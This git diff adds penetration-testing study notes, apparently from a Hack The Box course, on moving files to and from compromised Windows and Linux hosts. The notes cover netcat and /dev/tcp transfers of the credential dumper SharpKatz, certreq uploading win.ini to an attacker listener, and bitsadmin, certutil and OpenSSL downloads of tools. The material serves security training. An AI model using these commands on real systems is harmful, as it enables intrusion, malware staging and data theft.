@@ -1,4 +1,3 @@
-
 # 1.Windows File Transfer Method
 
 ## Download Operations
@@ -593,6 +592,204 @@ victim@target:~$ # Example using Ncat
 victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
 ```
 From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.
+### Netcat - Attack Host - Sending file to compromised machine
+```sh
+ness14@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+ness14@htb[/htb]$ # Example using Original Netcat
+ness14@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+```
+By utilizing Ncat on our attacking host, we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with `--send-only`, there is no need to anticipate further incoming information.
+### Ncat - Attack Host - Sending file to compromised machine
+```sh
+ness14@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+ness14@htb[/htb]$ # Example using Ncat
+ness14@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+```
+Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat.
+### Attack Host - Sending File as Input to Netcat
+```sh
+ness14@htb[/htb]$ # Example using Original Netcat
+ness14@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
+```
+### Compromised machine connect to netcat to receive the file
+```sh
+victim@target:~$ # Example using Original Netcat
+victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
+```
+Let's do the same with Ncat:
+### Attack Host - Sending file as input to Ncat
+```sh
+ness14@htb[/htb]$ # Example using Ncat
+ness14@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
+```
+### Compromised machine connect to ncat to receive the file
+```sh
+victim@target:~$ # Example using Ncat
+victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
+```
+If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).
 
+Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.
+### Compromised machine connecting to netcat using /dev/tcp to receive the file
+```sh
+victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+```
+## Powershell Session File Transfer
+By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.
 
+To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from `DC01` to `DATABASE01` and vice versa.
 
+We have a session as `Administrator` in `DC01`, the user has administrative rights on `DATABASE01`, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.
+### From DC01 - Confirm WinRM port TCP 5985 is open on DATABASE01
+```ps
+PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
+
+ComputerName     : DATABASE01
+RemoteAddress    : 192.168.1.101
+RemotePort       : 5985
+InterfaceAlias   : Ethernet0
+SourceAddress    : 192.168.1.100
+TcpTestSucceeded : True
+```
+Because this session already has privileges over `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer named `DATABASE01` and stores the results in the variable named `$Session`.
+### Create a Powershell Remoting Session to DATABASE01
+```ps
+PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
+```
+We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.
+### Copy samplefile.txt from our Localhost to the DATABASE01 Session
+```ps
+PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+```
+### Copy DATABASE.txt from DATABASE01 Session to our Localhost
+```ps
+PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+## RDP
+If we are connected from Linux, we can use `xfreerdp` or `rdesktop`. At the time of writing, `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.
+
+As an alternative to copy and paste, we can mount a local resource on the target RDP server. `rdesktop` or `xfreerdp` can be used to expose a local folder in the remote RDP session.
+### Mounting a Linux Folder Using rdesktop
+
+```sh
+ness14@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+```
+### Mounting a Linux Folder Using xfreerdp
+```sh
+ness14@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+```
+To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.
+![[tsclient.jpg]]Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.
+![[mstsc.png]]After selecting the drive, we can interact with it in the remote session that follows.
+
+> [!NOTE] Note: This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.
+
+# 5. Living off the Land
+
+The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. There are currently two websites that aggregate information on Living off the Land binaries:
+
+- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
+-  [GTFOBins for Linux Binaries](https://gtfobins.github.io/)
+
+Living off the Land binaries can be used to perform functions such as:
+
+- Download
+- Upload
+- Command Execution
+- File Read
+- File Write
+- Bypasses
+## Using the LOLBAS and GTFOBins Project
+[LOLBAS for Windows](https://lolbas-project.github.io/#) and [GTFOBins for Linux](https://gtfobins.github.io/) are websites where we can search for binaries we can use for different functions.
+### LOLBAS
+![[LOLBAS.jpg]]
+Let's use [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) as an example.
+
+We need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.
+### Upload win.ini
+```ps
+C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
+Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
+```
+This will send the file to our Netcat session, and we can copy-paste its contents.
+## File Received in our Netcat Session
+```sh
+ness14@htb[/htb]$ sudo nc -lvnp 8000
+
+listening on [any] 8000 ...
+connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
+POST / HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Pragma: no-cache
+Content-Type: application/json
+User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
+Content-Length: 92
+Host: 192.168.49.128:8000
+
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+```
+If you get an error when running `certreq.exe`, the version you are using may not contain the `-Post` parameter. You can download an updated version [here](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again.
+## GTFOBins
+To search for the download and upload function in [GTFOBins for Linux Binaries](https://gtfobins.github.io/), we can use `+file download` or `+file upload`.
+
+![[GTFOBins.jpg]]
+Let's use [OpenSSL](https://www.openssl.org/). It's frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."
+We need to create a certificate and start a server
+### Create Certificate
+```sh
+ness14@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+
+Generating a RSA private key
+.......................................................................................................+++++
+................+++++
+writing new private key to 'key.pem'
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:
+Email Address []:
+```
+### Stand up the Server
+```sh
+ness14@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+```
+Next, with the server running, we need to download the file from the compromised machine.
+### Download file from the compromised machine
+```sh
+ness14@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+```
+## Other Common Living off the Land tools
+### Bitsadmin Download function
+The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.
+### File Download with Bitsadmin
+```ps
+PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+```
+PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.
+### Download
+```ps
+PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+```
+### Certutil
+Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto `wget` for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.
+### Download a file using certutil
+```ps
+C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+```
